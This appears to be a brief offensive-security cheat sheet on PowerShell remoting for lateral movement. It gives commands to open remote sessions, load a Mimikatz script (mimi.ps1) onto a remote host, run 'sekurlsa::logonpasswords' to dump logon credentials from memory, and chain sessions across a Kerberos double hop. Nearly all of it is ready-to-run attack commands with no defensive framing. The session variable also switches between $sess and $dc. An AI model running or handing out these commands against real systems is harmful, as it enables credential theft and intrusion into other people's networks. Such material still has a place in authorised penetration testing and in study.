# Powershell

## Commands

### Create a remote session

```text
$sess = New-PSSession -ComputerName lab.test.local
```

### Load a script 

```text
Invoke-Command  -FilePath{C:\temp\mimi.ps1} -Session $dc
```

### Execute the script

```text
 Invoke-Command -ScriptBlock{invoke-mimikatz -command '"sekurlsa::logonpasswords"'} $dc
```

#### Using credentials \(password needed\)

```text
Invoke-Command -ScriptBlock {ipconfig} -ComputerName target -Credential TEST\user
```

### Kerberos double hop

#### Execute command from remote session from target into target2

```text
$sess = New-PSSession -ComputerName lab.test.local
Invoke-Command -ScriptBlock{ $db = New-PSSession -ComputerName target2} -Session $sess
```

